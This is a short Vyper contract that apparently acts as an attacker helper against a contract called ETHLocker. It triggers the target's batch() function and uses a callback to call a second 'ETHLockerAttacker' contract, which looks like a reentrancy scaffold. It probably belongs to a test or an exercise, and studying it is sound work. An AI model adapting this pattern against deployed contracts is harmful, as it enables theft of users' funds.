#pragma evm-version cancun

interface ETHLocker:
    def batch(): nonpayable
    def balanceOf(user : address) -> int256 : view

interface ETHLockerAttacker:
    def run(): nonpayable

event Number:
	number : indexed(uint256)

other : address

@payable
@external
def run(_eth_locker : address, _other : address):
    self.other = _other
    ETHLocker(_eth_locker).batch()

@external
def callback():
    ETHLockerAttacker(self.other).run()